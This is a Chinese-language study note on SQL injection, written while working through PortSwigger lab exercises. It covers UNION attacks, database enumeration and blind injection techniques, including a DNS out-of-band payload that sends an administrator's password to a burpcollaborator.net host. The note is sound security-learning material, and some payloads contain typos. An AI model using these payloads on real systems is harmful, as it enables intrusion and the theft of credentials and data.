# SQL Injection

### 什么是SQL 注入？

SQL注入是一种**网络安全漏洞**，允许攻击者干扰应用程序对其数据库的**查询**。这可能让攻击者查看他们通常无法检索的数据。包括属于其他用户的数据，或应用程序可以访问的其他任何数据。在许多情况下，攻击者可以**修改**或者**删除**这些数据，导致应用程序内容或者行为**持续发生变化**。

在某些情况下，攻击者可以升级SQL攻击，攻破底层服务器或其他后端基础设施。它还能使他们能够实施**拒绝服务攻击。**

### 成功的SQL注入攻击会产生的影响：

成功的SQL注入攻击可能导致敏感数据被未经授权访问。

- 密码
- 信用卡信息
- 个人用户信息

### 如何检测SQL注入漏洞

通过一套系统性的测试，针对应用程序中的每个入口点来手动检测SQL注入。需要提交的内容：

- 单引号字符 `'` ,并寻找错误或者其他异常现象。
- 一些能评估入口点原始基值，又能评估为不同值得特定SQL语法，并寻找应用程序响应中得系统性差异。
- 布尔条件：如 `OR 1=1`和`OR 1=2`,并寻找应用程序响应的差异。
- 设计用于在SQL查询中执行时触发时间延迟的载荷，并寻找响应时间的差异。
- 设计用于在SQL查询中执行时触发带外网络交互的OAST载荷，并监控任何由此产生的交互。

或者！使用Burp Scanner快速，可靠的发现大多数SQL注入漏洞。（埋个点，之后学习）

#### 查询语句中不同部分的SQL注入 

大多数SQL注入漏洞发生在SELECT查询的WHERE子句中。

然而，SQL注入漏洞可能出现在查询中的任何位置，也可能出现在不同类型的查询中。其他一些常见的出现SQL注入的位置包括：

- 在 `UPDATE`语句中，出现在更新的值或WHERE子句中。
- 在 `INSERT`语句中，出现在插入的值中。
- 在 `SELECT`语句中，出现在表名或列名中。
- 在 `SELECT`语句中，出现在 `ORDER BY`子句中。

### SQL注入示例

#### 检索隐藏数据

你可以修改SQL查询以返回额外结果

##### 具体操作示例：

在一些平台中，会有一些未发布的商品或者信息，那么我们可以利用SQL中的注释符 `--` 来注释掉一些限制信息

- 进入购物平台（lab）

- 当点击商品类别的时候，浏览器会请求URL：`https://insecure-website.com/products?category=Gifts`   （类似）

- 该查询导致的底层数据库逻辑：`SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 

- `released` 就是限制条件，限制条件为1，用于隐藏未发布的商品，对于未发布的商品，我们可以假设其URL的限制条件为 `released = 0`

- 该应用程序没有任何的防御措施，所以可以造成攻击，例如`https://insecure-website.com/products?category=Gifts'--`    

- 关键点是 `--` ，这是SQL中的注释标记符，也就是意味着，该查询的其余部分会被注释，从而被有效移除，因此，所有的产品都会被显示，包括未发布的。

- 类似的手段，使应用程序显示任意类别的所有的产品，包括那些它未知的类别：

  `https://insecure-website.com/products?category=Gifts'+OR+1=1--`

  

#### 颠覆应用程序逻辑 

通过修改查询来干扰应用程序的逻辑

##### 具体操作示例：

设想一个允许用户使用用户名和密码登录的应用程序。怎么样才可以不需要密码就可以登录`administrator`的账户

- 使用burp拦截登录请求
- 在burp的request中修改请求，注释掉password `‘--`
- 然后再重新发送请求

#### 从其他表中检索数据

当应用程序返回SQL查询结果时，攻击者可以利用SQL injection漏洞从数据库中检索其他表的数据

可以通过 `UNION` 关键字执行额外的 `SELECT` 查询，并将结果附加到原始查询中。

例如：

原始查询：`SELECT name, description FROM products WHERE category = 'Gifts'`

攻击者可以提交输入 `' UNION SELECT username, password FROM users--`  这就会导致应用程序返回所有的用户名和密码，以及产品的名称和描述。

##### MORE ABOUT UNION

```
MORE ABOUT UNION: 后续会有详细解释。------UNION attacks
```

#### 盲注式SQL注入

许多SQL注入漏洞属于盲漏洞。

这就意味着应用程序在响应中不会返回SQL查询的结果或任何数据库错误的详细的信息。盲漏洞仍可被利用访问未经授权的数据，但涉及技术通常较为复杂且难以实施。

根据漏洞的性质和涉及的数据库，可采用**以下技术利用盲注式SQL注入漏洞：**

- 可以修改查询逻辑，使其根据单个条件的真值触发应用程序响应中的可检测差异。这可能涉及向某些布尔逻辑中注入新条件，或条件性地触发错误（例如除以零错误）。
- 可以条件性地触发查询处理中的时间延迟。这使您能够根据应用程序响应所需的时间来推断条件的真值。
- 可以通过OAST技术触发带外网络交互。该技术威力极强，在其他技术失效时仍能奏效。通常可直接通过带外通道窃取数据，例如将数据植入您控制的域名的DNS查询中。

##### MORE ABOUT BLIND SQL INJECTION

```
后续。
```



#### 二阶SQL注入

（简单来说就是在一阶SQL注入的时候发生SQL查询，但是应用程序以不安全的方式纳入SQL查询，这样也就发生了一阶SQL注入，而二阶注入发生的时候的，应用程序会把之前的HTTP请求中获取用户输入并将其存储以备后续的需要，也就是他存储了之前不安全的一阶注入，随后再处理其他的HTTP请求的时候，应用程序会检索存储的数据，再次以不安全的方式将其纳入SQL查询，所以二阶查询就发生了也叫做存储型SQL注入。）

发生情况：
二阶注入通常发生在开发人员已知SQL注入漏洞的情况下，开发人员会安全的处理输入数据初始写入数据库的操作，随后在数据处理阶段，由于数据已被安全的写入数据库，故被视为安全数据，此时，由于开发人员错误的认为数据可信，导致数据处理方式存在安全隐患。

#### 检查数据库

SQL语言的某些核心特性在主流数据库的平台上是以相同的方式实现的，但是常见的数据库之间也是有着一些差异的，这就意味着某些用于检测和利用SQL注入的技术在不同平台上的运作方式不同，例如：

- Syntax for string concatenation.
- conmments
- batched(or stacked)queries
- platform messages
- error messages

所以我们就需要查询相关的数据库信息

##### SQL注入速查表

https://portswigger.net/web-security/sql-injection/cheat-sheet           

##### 在SQL注入攻击中检查数据库

https://portswigger.net/web-security/sql-injection/examining-the-database          

##### SQL注入速查表

https://portswigger.net/web-security/sql-injection/cheat-sheet


### UNION attacks

#### SQL injection UNION attacks

##### 概述：

当应用程序存在SQL注入漏洞，且查询结构被包含在应用程序的响应中时，攻击者可利用UNION关键字从数据库中检索出其他表的数据。

##### UNION关键字：

允许执行一个或多个额外的SELECT查询，并将结果附加到原始查询中

```
SELECT a,b FROM table1 UNION SELECT c,d FROM table2
```

该查询返回包含两列的单一结果集，其中包含table1表中的a,b列的值，以及table2表中c,d列的值

##### UNION查询生效的条件

- 每个查询都必须返回相同数量的列
- 各列中的数据类型在各个查询之间必须兼容

##### 实施UNION攻击的条件

- 原始查询返回了多少列
- 原始查询返回的哪些列具有合适的数据类型，能够容纳注入查询的结果

#### Determining the number of columns required

当执行SQL注入攻击的时候，有两种方法可确定原始查询返回的列数

1. ##### 注入一系列 `ORDER BY` 子句

   概述：注入一系列 `ORDER BY` 子句，并递增指定列索引直至触发错误。

   例如：若注入点位于原始查询中的 `WHERE` 子句内的引号字符串内，则需要提交：

   ```
   ‘ ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   etc.
   ```

   这一系列的payloads修改了原始查询，使结果按照结果集的不同列排序。子 `ORDER BY` 句中的列可以通过其索引指定，因此你不需要知道任何列的名称。当指定的列索引超过结果集中的实际列数时，数据库就会返回错误，例如

   ```
   The ORDER BY position number 3 is out of range of the number of items in the select list.
   ```

   应用程序可能在HTTP响应中返回数据库错误，但也可能发出通用错误响应。在其他情况下，它可能根本没有结果。无论如何，只要你能检测到回复中的差异，就能推断出查询返回了多少列。

   

2. ##### 提交一系列指定不同数量空值的 `UNION SELECT` payloads

   ```
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   stc.
   ```

   如果空值的数量与列数不匹配，数据库就会反悔错误：

   ```
   All queries combined using a UNION,INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
   ```

   使用 `NULL` 作为 `SELECT` 查询返回的值，因为每列的数据类型必须在原始查询和注入查询之间兼容，。 `NULL` 可以转化为所有常见的数据类型，因此当列计数正确的时候，最大化了payload成功的概率

   

#### LAB:SQL注入UNION攻击，确定查询返回的列数

##### LAB：

该实验室的产品类别筛选器存在SQL注入漏洞。查询结果会返回在应用程序响应中，因此可利用UNION攻击从其他表中获取数据。此类攻击的第一步是确定查询返回的列数。后续实验中将运用此技术构建完整的攻击方案。

为解决该实验，需通过执行SQL注入UNION攻击来确定查询返回的列数，该攻击将返回额外一行包含空值的数据。

##### Pain Point:

- 在哪里增加字段

  **solved：**先用`burp`进行拦截，在`request`中的URP进行修改，`category="类别"`后面加字段，

- 在`repeater`中`send`为什么不管用

  在`repeater`中进行测试，可以在`render`中看到网页的实时反馈，但是在浏览器中不会发送

  测试完成后，可以在`intercepte`中进行`post`。

- 为什么`ORDER BY`完成后不会显示`solved`

  因为该题目要求查询返回的列数，该攻击将返回额外一行包含空值的数据，所以只能用 `' UNION SELECT NULL-- `

##### Payload:

1. 打开lab环境，使用burp拦截click sort的请求

2. send to repeater ，在repeater中修改URP

3. 修改category 的参数，在其值的后面加上 `’+UNION+SELECT+NULL--`

4. 观察其是否出错

5. 如果出错则再次修改参数，添加包含空值的额外列：

   ```
   ‘ UNION SELECT NULL,NULL--
   ```

6. 直至错误消失

**payload：**`category=Pets' UNION SELECT NULL,NULL,NULL--`

#### Database-specific syntax

在Oracle数据库中，每个SELECT查询都必须使用FROM关键字来指定有效的表。Oracle内置了一个名为dual的表，可用于此目的。因此针对Oracle的注入查询呈现如下形式：

```
' UNION SELECT NULL FORM DUAL--
```

所述的payload使用双破折号注释序列 `--` ，也注入点之后的原始查询剩余部分注释掉。在MYSQL中。双破折号序列后必须跟一个空格，或者，也可以使用 `#` 来标识注释

类似于的数据库特定语法的更多详细信息：https://portswigger.net/web-security/sql-injection/cheat-sheet

#### Finding columns with useful data type

SQL注入UNION攻击可使获取注入查询的结果。需要获取的有效数据通常以字符串形式呈现。这意味着需要在原始查询中找到一个或多个数据类型为字符串或与字符串兼容的列

确定列数后，可以逐列测试是否支持字符串数据：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果列数据类型与字符串类型不兼容，注入的查询将导致错误。

#### LAB：SQL注入UNION攻击，查找包含文本的列



##### Pain Point:

- 在输入payload报错的时候，页面上是有提示的，提示应该查询的字符串是什么，没看见，导致错误

##### Solved:

1. 先确定列数，输入payload

   `‘ UNION SELECT NULL,NULL,NULL--`

2. 确认列数之后再输入payload，即可以确定。

   `' UNION SELECT NULL,NULL,'C3uRYe',NULL--`

#### Using a SQL injection UNION to retrieve interesting data

当你确定了原始查询返回的列数，并找到哪些列可以存储字符串数据的时候，你就可以检索有趣的数据了。

假设：

- 原始查询返回两列数据，两者均可存储字符串数据
- 注入点是 `WHERE` 子句中的一个引号字符串
- 该数据库包含一个名为 `users` 的表，其中包含 `username` `password` 两个列

在这个例子中，可以通过提交以下payload来检索 `users` 表的内容

```
' UNION SELECT username,password FROM users--
```

要实施此攻击，必须要知道：

- 存在一个 `users` 的表
- 包含两个列 `username` `password`

所有现代数据库都提供了检查数据库结构的方法，从而确定其中包含哪些表和列。

（埋点，后续讲解如何查询数据库结构-----Examining the database）

#### LAB:SQL注入UNION攻击，从其他表中检索数据

##### lab:

该实验室的产品类别筛选器存在SQL注入漏洞。查询结果会返回在应用程序响应中，因此可利用UNION攻击从其他表中获取数据。要构建此类攻击，需结合先前实验中学习的多种技术。

该数据库包含一个名为`users` 的不同表，其中包含名为`username` 和`password` 的列。

要完成本实验，请执行SQL注入UNION攻击以获取所有用户名和密码，并利用这些信息以`administrator` 用户身份登录。

##### Pain Point:

- 这把没有

##### Solved:

1. 拦截查找类型的请求
2. 修改category的值
3. payload：`' UNION SELECT username,password FROM users--`

#### Retrieving multiple values within a single column

在某些情况下，前面例子中的查询可能只能返回单一列

在单列中通过连接多个值来同时检索他们。可添加分隔符以区分组合后的值，例如，在Oracle中，可提交如下输入：

```
' UNION SELECT username || '~' || password FROM users--
```

此处使用双竖线序列`||`，该序列在`Oracle`中作为字符串连接运算符。注入的查询将`username`和`password`字段的值连接起来，并以 `~` 字符作为分隔符

查询结果：

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

不同数据库使用不同的语法来执行字符串连接。

（埋点，具体不同数据库不同语法的详情-----SQL injection cheat sheet）

#### LAB:SQL注入UNION攻击，在单列中检索多个值

##### lab:

该实验室的产品类别筛选器存在SQL注入漏洞。查询结果会返回在应用程序响应中，因此可利用UNION攻击从其他表中获取数据。

该数据库包含一个名为`users` 的不同表，其中包含名为`username` 和`password` 的列。

要完成本实验，请执行SQL注入UNION攻击以获取所有用户名和密码，并利用这些信息以`administrator` 用户身份登录。

##### Pain Point:

- 不能直接检索，因为是在单列中检索，所以得找出哪一列是字符串的那一列。
- 在做题目时，还是得一步一步来

##### Solved:

1. 应用UNION查询，是否包含两个列，以及哪一列是与字符串兼容的列
2. 再进行检索，输入payload:`' UNION SELECT NULL,username || '~' || password FROM users--`



### Examining the database

#### 在SQL注入攻击中检查数据库

要利用SQL注入漏洞，通常需要获取有关数据库的信息：

- 数据库软件的类型和版本
- 数据库包含的表和列

#### 查看数据库类型和版本

通过注入特定于提供商的查询来检测其是否有效，可能能够同时识别数据库类型和版本。

以下是一些用于确定常见数据库类型的数据库版本查询：

```
Database type           Query
Microsoft,MySQL         SELECT @@version
Oracle                  SELECT * FORM v$version
PostgreSQL              SELECT version()
```

例如，可以使用以下输入进行UNION攻击：

```
' UNION SELECT @@version--
```

这可能会返回以下输出：

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

在这种情况下，可以确认是Microsoft SQL Server并查看所使用的版本。



#### LAB:SQL注入攻击，查询Oracle数据库类型与版本

##### lab:

该实验室的产品类别筛选器存在SQL注入漏洞。您可利用UNION攻击从注入的查询中获取结果.

要完成该实验，请显示数据库版本字符串。

##### Pain Point:

- 还是有点卡在审题方面，但是后续很快就想起了
- 这道题结合了之前学的很多东西，不止是查询数据库类型
- 几乎无pain point

##### Solved:

1. 测试数据库版本类型

   `' UNION SELECT * FORM v$version--`

2. 根据页面提示，把版本字符串显示在页面中

   `' UNION SELECT NULL,NULL FORM dual--`  

   `' UNION SELECT NULL,'A' FORM dual--`

   A---版本号



#### LAB:SQL注入攻击，查询MySQL和Microsoft数据库的类型和版本

这一lab和上一个lab是类似的唯一不同的是数据库的类型不同

所以，查询的方式会有所不同，在Oracle数据库中，每一个SELECT语句都需要FROM来指定表，但是Oracle数据库中内置了一个表：dual，可以用于查询。

所以Mysql,Microsoft数据库不用FROM，但是他的注释符号变了：`#`



#### 列出数据库的内容

大多数数据库类型(除Oracle外)都包含一组称为信息模式的视图。该视图提供有关数据库的信息。

例如：可以通过查询 `information_schema.tables` 来列出数据库中的表

```
SELECT * FROM information_schema.tables
```

该查询将会返回：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

输出显示一共有三个表：`Products` `Users` `Feedback` 

可以通过查询 `information_schema.columns` 来列出各个表的列：

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

返回输出：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

输出显示指定表的列和列的数据类型



#### LAB：SQL注入攻击，在非Oracle数据库上列出数据库内容

##### lab:

该实验室的产品类别筛选器存在SQL注入漏洞。查询结果会返回在应用程序响应中，因此可利用UNION攻击从其他表中获取数据。

该应用程序具备登录功能，其数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，随后检索表中的内容以获取所有用户的用户名和密码。

要完成实验，请以`administrator` 用户身份登录。

##### Pain Point:

- 再次忘记第一步要先查询返回的列数和哪些列包含文本数据！

  `' UNION SELECT 'A','B'--`

- 查询表名，`SELECT` 后跟 `table_name` 就行。

  `' UNION SELECT table_name,NULL FROM information_schema.tables--`

- 表名太多，无法找到哪个是包含用户信息和密码的表。

  把user的表都看一遍，或者去让AI猜测选择

  结果为 `users_svghss`

##### Solved:

1. 查询列数以及数据类型：

   `' UNION SELECT 'A','B'--`

2. 检索数据库中的表名

   ``' UNION SELECT table_name,NULL FROM information_schema.tables--``

3. 查找包含用户信息的表名：AI or 尝试

4. 检索包含用户信息的表中的列：

   `' UNION SELECT coulumn_name,NULL FROM information_schema.columns WHERE table_name='users_svghss'--`

5. 查找用户名和密码的列名

   `username_bdhcqv`

   `password_saarqs`

6. 检索所有的用户名和密码：

   `' UNION SELECT username_bdhcqv,password_saaras FROM users_svghss--`



#### 列出Oracle数据库的内容

在Oracle数据库中，可以通过以下方式找到相同的信息：
通过查询 `all_tables` 来列出表

```
SELECT * FROM all_tables
```

通过查询 `all_tab_columns` 来列出列：

```
SELECT * FROM all_tab_columns WHERE table_name='USERS'
```



#### LAB:SQL注入攻击，列出Oracle数据库的内容

##### lab:

该实验室的产品类别筛选器存在SQL注入漏洞。查询结果会返回在应用程序响应中，因此可利用UNION攻击从其他表中获取数据。

该应用程序具备登录功能，其数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，随后检索表中的内容以获取所有用户的用户名和密码。

要完成实验，请以`administrator` 用户身份登录。

##### Pain_Point:

- 列名是 `column_name` 不是 `table_column`!!!!!!

##### Solved:

与上一lab接近，所以简写一下步骤：

```
' UNION SELECT 'A','B' FORM dual--
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'--
' UNION SELECT 'column_name','column_name' FROM 'table_name'--
```



### Blind SQL injection

#### 什么是Blind SQL injection?

当应用程序存在SQL注入漏洞，但其HTTP响应中既不包含相关SQL查询的结果，也不包含任何数据库错误的详细信息，就会发生盲SQL注入。

许多攻击（如UNION攻击）对盲注型SQL注入漏洞无效。这是因为这些技术依赖于能够在应用程序响应中看到注入查询的结果。虽然仍可利用盲注型SQL注入未经授权恶的数据，但必须采用不同的技术手段。



#### 通过触发条件响应利用盲注式SQL注入

考虑一个使用跟踪Cookie来收集使用分析数据的应用程序。对该应用程序的请求包含类似的Cookie表头：

```
Cookie:TrackingId=u5YD3PapBcR4lN3e7Tj4
```

当处理包含 `TrackingId` cookie的请求时，应用程序会通过SQL查询判断该用户是否为已知用户：

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

此查询存在SQL注入漏洞，但查询结果不会返回给用户。不过，应用程序的行为会根据查询是否收到返回数据而有所不同。若提交被识别过的的 `TrackingId` ，查询将返回数据，响应中会收到`WELCOME BACK`的提示信息。

这种行为足以利用盲注式SQL注入漏洞，根据注入条件触发不同的响应来获取信息。

要理解此漏洞的工作原理，假设发送了两个请求，其中依次包含以下 `TrackingId` cookie值：

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- 这些值中的第一个会导致查询返回结果，因为注入的 `AND '1'=1` 条件为真。因此，系统会显示 `WELCOME BACK` 的信息。

- 第二个值导致查询不返回任何结果，因为注入条件为假。

这些就能够使我们确定任何单个注入条件的答案，并逐次提取数据。

例如：
假设存在一个名为 `Users` 的表，包含 `Username` `Password` 两列，以及一个名为 `Administrator` 的用户。你可以通过一系列输入逐个字符测试密码，来确定该用户的密码。

1. ```
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1) > 'm
   ```

   如果返回 `WELCOME BACK` 的提示信息，表面注入的条件成立，因此密码的首字符大于`m`

2. ```
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1) >'t
   ```

   不返回 `WELCOME BACK` 的消息的话，表明注入的条件为假，因此密码的首字母小于等于t

3. ```
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1) ='s
   ```

   该输入如果返回 `WELCOME BACK` ,从而可以确认密码的首字符是`s`

##### payload详细解释：

`'` 用来闭合原SQL字符串，让后面注入的语句生效

`AND` 把你的判断条件附加到原查询中，如果条件为`TRUE` 则 `welcome back` 反之则不，这也是盲注的核心逻辑。

`SUBSTRING()` 意思是从一个字符串中截取部分内容：`SUBSTRING(string，start_position,length)`

例如：`SUBSTRING(...,1,1)` 意思是取密码的第一个字符





#### 基于错误的SQL注入

基于错误的SQL注入是指即使在盲注环境下，也能利用错误信息从数据库中提取或推断敏感数据的情况：

- 可能能够根据布尔表达式的结果诱使应用程序返回特定的错误响应。

  具体了解：通过触发条件错误利用盲注SQL注入

- 也可能能够触发输出查询返回数据的错误信息。这能够将原本隐蔽的SQL注入漏洞转化为可视化漏洞。

  具体了解： 通过冗长SQL错误信息提取敏感数据

#### 通过触发条件错误利用盲注SQL注入

某些应用程序执行SQL查询时，其行为不会因查询是否返回数据而改变（盲注）

##### 解决方法：

通常可以根据SQL错误是否发生来诱导应用程序返回不同的响应。可以修改查询语句，使其仅在条件为真的时候才会引发数据库错误。很多时候，数据库抛出的未处理错误会导致应用程序响应出现差异（例如显示错误信息），从而让你能够推断注入条件的真伪。

##### 工作原理：

假设依次发送两个请求，其中包含以下 `TrackingId` cookie值：

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

##### payload详细解释：

`CASE` 是SQL中的条件判断语句，相当于IF

语法结构：

```
CASE
	WHEN condition THEN value_if_true
	ELSE value_if_false
END
```

`WHEN(1=2)` 判断 `1=2` 是否为真，若为真即执行 `THEN`  ，为假则`THEN` 部分不会执行

`THEN 1/0` 若`THEN` 执行，则会引发除0错误。

`ELSE 'a'` 条件不成立时返回 `'a'` 

 最后再比较与a是否相等，若相等则页面正常，若不等则页面会不同。

如果错误导致应用程序的HTTP响应出现差异，则可根据此判断注入的条件是否为真。



使用此技术，可以通过逐个字符测试来检索数据：

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password,1,1)>'m')THEN 1/0 ELSE 'a' END FROM Users)='a
```

##### payload详细解释：

整个payload的结构：

`' AND (SELECT CASE WHEN(condition)THEN 1/0 ELSE 'a' END FROM USERS)`

为什么后面会加USERS,在condition中用了该表中的列，所以需要指定该表。





#### 通过冗长的SQL错误信息提取敏感数据

<u>数据库配置错误时，有时候会导致冗长的错误信息，这些信息可能为攻击者提供有用的情报。例如，当向 `id` 参数注入单引号后，会出现以下错误信息：</u>

##### 注入单引号的作用:

单引号是SQL字符串的结束符，如果应用没有过滤，会破坏原SQL语句结构，这有助于判断是否存在SQL注入漏洞。

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id ='''. Expected char
```

由于连续两个单引号导致语法错误，出现以上错误信息。

错误信息中包含重要的信息：**完整的SQL语句。**

泄露了SQL查询结构：表名：`tracking` 字段名：`id`  注入点位置，WHERE条件格式

有利于攻击者更准确的构造payload。

<u>这段代码展示了应用程序根据我们的输入构建的完整查询语句。可以看出，本次注入发生在 `WHERE` 语句中的单引号字符串内。这种结构使得构建包含恶意payload的有效查询更为容易。注释掉查询语句的其余部分，可避免多余的单引号破坏语法结构。</u>

注释掉多余的单引号，SQL语法恢复正常，可以继续注入。

<u>有时，你可能能够诱使应用程序生成包含查询返回部分数据的错误信息。这实际上将原本隐蔽的SQL注入漏洞转化为可视化的漏洞。</u>

**如果数据库把错误信息显示在网页上---那么就可以利用错误显示内部数据。**

可以使用 `CAST()` 函数实现此功能。该函数可将一种数据类型转换为另一种数据类型。

例如，假设某个查询包含以下语句：

```
CAST((SELECT example_column FROM example_table) AS int)
```

通常，你视图读取的数据是字符串，若尝试将其转换为不兼容的数据类型（例如 `int`）

假如密码是字符串，数据库就会报错。

可能会引发类似以下的错误：

```
ERROR: invalid input syntax for type integer: "Example data"
```

当字符串导致无法触发条件响应时，此类查询同样可能有所帮助。

**为什么使用 `CAST`?**

因为故意让数据库：

- 取出一个字符串
- 试图把他转换成整数
- 导致报错
- 错误信息里就会包含真实数据

适用于：

页面不回查询结果，但回数据库错误。

##### 实际操作步骤：

burp拦截请求----找到可疑参数---尝试加 `'`---看响应是否报错---若报错，存在注入---继续构造payload提取数据





#### 通过触发时间延迟利用盲注SQL注入

<u>如果应用程序在执行SQL查询时捕获了数据库并优雅的处理了他们，那么应用程序的响应将不会有任何差异。这意味着先前用于诱发条件错误的技术将不再有效。</u>

<u>在此情况下，通常可触发时间延迟来利用盲注式SQL注入漏洞，具体取决于注入条件的真伪。由于应用程序通常以同步方式处理SQL查询，延迟SQL查询的执行也会延迟HTTP响应。这是的你能够根据接收HTTP响应所耗时间来判断注入条件的真伪。</u>

##### 时间盲注的核心原理：

数据库通常是同步执行SQL查询的，也就是说：

- SQL执行慢，HTTP响应也会慢

##### 各数据库的延迟方式不同

`SQL Server` :    

```
WAITFOR DELAY '0:0:10'
```

`MySQL`:

```
SLEEP(10)
```

`PostgreSQL`:

```
pg_sleep(10)
```

`Oracle`:

```
无sleep，需要利用 DBMS_PIPE.RECEIVE_MESSAGE
```

<u>触发时间延迟的技术取决于所使用的数据库类型。例如，在Microsoft SQL Server上，可以使用以下方法根据表达式真值测试条件并触发延迟：</u>

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- 第一个输入不会触发延迟，因为条件 `1=2` 为假
- 第二个输入会触发10秒延迟，因为条件 `1=1` 为真

##### payload解释：

**目的：**

这两个`payload` 的目的是测试该地方有没有漏洞可以盲注。

若第二个语句确实延迟了10秒，则说明这个位置可控，可盲注。

`';` 

闭合当前SQL字符串，开始写自己的语句

`WAITFOR DELAY '0:0:10'`

让数据库故意等10秒



使用这种技术，我们可以逐个字符测试来检索数据：

```
'; IF (SELECT COUNT(Username) FROM Users  WHERE Username = 'Administrator' AND SUBSTRING(Password,1,1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

##### `payload` 解释：

`SELECT COUNT(Usename) FROM Users`

查看用户数量是否存在

`WHERE Username='Adiministator'`

只看 `Adiministrator` 用户的

`SUBSTRING(Password,1,1)>'m'`

password的第一个字符是都大于m

`=1`

如果上面条件成立->COUNT=1->TRUE

如果不成立->COUNT=0->FASLE



#### 利用带外攻击（OAST）技术实施盲注SQL注入

##### 为什么普通盲注方法无效？

<u>某个应用程序可能执行与前例相同的SQL查询，但采用异步方式实现。该应用程序在原始线程中继续处理用户请求，同时使用另一个线程通过跟踪Cookie执行SQL查询。该查询仍存在SQL注入漏洞，但此前描述的所有技术均无法奏效。应用程序的响应结果既不依赖于查询返回数据，也不受数据库错误发生与否或查询执行时间长短的影响。</u>

<u>在此情景下，通常可通过触发于受控系统之间的带外网络交互来利用盲注SQL注入漏洞。这些交互可基于注入条件逐步触发，从而逐条推断信息。更具实用价值的是，数据可在网络交互过程中直接外泄。</u>

##### 什么是OAST?

通过数据库触发一个“外部网络请求”，请求我们的服务器。

比如触发：

- 一个DNS查询
- 一个HTTP请求
- 一个SMTP发邮件
- 等其他“出网行为”

如果数据库能根据你注入的条件，向你控制的服务器发送请求，那么：

**你只要看看，有没有收到请求，**就能知道条件是真是假。

甚至还可以：

**把敏感信息放进DNS/HTTP请求中，直接外协密码**

这就是OAST。



<u>使用带外技术最简单可靠的工具是burp collaborator。这是一个提供多种网络服务（包括DNS）定制实现的服务器。它能够帮助您检测向存在漏洞的应用程序发送单个payload引发的网络交互。</u>

##### 什么是burp collaborator？

burp提供的一个“监听服务器”。

它会生成一个唯一的域名，只要目标数据库向这个域名发起DNS/HTTP请求：

- collaborator就能收到
- burp中会显示你收到了请求
- 证明payload成功执行

就像是一种**出网信号**。



##### 测试能够触发DNS查询：

SQL Server中常用的带外函数： `xp.dirtree` 

当SQL Server尝试访问这个UNC路径时，他必须先查询这个域名的DNS记录！！！

所以你只需要控制这个域名，就能收到DNS请求。如下操作：

触发DNS查询的技术取决于所使用的数据库类型，例如，在Microsoft SQL Server可使用以下输入，对指定域执行DNS解析：

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

这会导致数据库对以下域名执行查找操作：

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

你可以使用burp collaborator生成一个唯一的子域名，并轮询collaborator服务器以确认何时发声DNS查询。

于是：

- 如果collaborator收到DNS查询，说明注入成功
- 如果收不到，说明注入失败，或者位置不对。



在确认了触发带外交互的方法之后，即可利用该带外通道从存在漏洞的应用程序中窃取数据：

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```



此输入读取 `Administrator` 用户和密码，附加一个唯一的collaborator子域名，并触发DNS查询，该查询可让您查看捕获的密码：

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

<u>带外攻击（OAST）技术是检测和利用盲注SQL注入的强力手段，因其成功率高且能通过带外通道直接窃取数据。正因如此，即使在其他盲注技术可行的场景中，OAST技术也往往更受青睐。</u>



##### `payload`解释：

```
declare @p varchar(1024)
```

**声明变量**：开一个字符串变量 `@p`

```
set @p=(SELECT password FROM users WHERE username='Administrator')
```

**将管理员密码写入这个变量**：假设密码是 `xxx` ,那么此时的`@p`就变成了 `xxx`

```
"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"
```

**拼出一个域名，把密码放进域名里！**

数据库就会向:`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`发起DNS查询。

触发`xp_dirtree`解析这个路径：

于是collaborator服务收到一个DNS请求，管理员密码就直接泄露出来了。







### 不同于上下文下的SQL注入

